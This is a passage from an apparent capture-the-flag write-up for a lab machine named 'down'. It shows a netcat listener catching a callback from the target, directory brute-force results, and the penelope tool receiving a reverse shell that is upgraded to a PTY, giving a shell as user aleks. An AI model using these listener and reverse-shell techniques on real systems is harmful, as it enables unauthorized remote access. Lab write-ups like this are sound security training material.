...
❯ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 51842
GET / HTTP/1.1
Host: 10.10.xx.xx
...
200      GET       27l       70w      739c http://10.129.xx.xx/index.php
200      GET     1302l     7419w   578132c http://10.129.xx.xx/logo.png
301      GET        9l       28w      321c http://10.129.xx.xx/javascript => http://10.129.xx.xx/javascript/
200      GET       93l      207w     1794c http://10.129.xx.xx/style.css
200      GET       27l       70w      739c http://10.129.xx.xx/
301      GET        9l       28w      328c http://10.129.xx.xx/javascript/jquery => http://10.129.xx.xx/javascript/jquery/
200      GET    10879l    44396w   288550c http://10.129.xx.xx/javascript/jquery/jquery
```
...
```
[####################] - 3m     30000/30000   178/s   http://10.129.xx.xx/javascript/jquery/                                                                                                                                         ❯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 172.18.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from down~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/down~10.129.xx.xx-Linux-x86_64/2025_10_18-17_37_29-741.log 📜
─────────────────────────────────────────────────────────────────
...
Last login: Sat Oct 18 15:46:57 2025 from 10.10.xx.xx
aleks@down:~$
```
We’re now **aleks**.
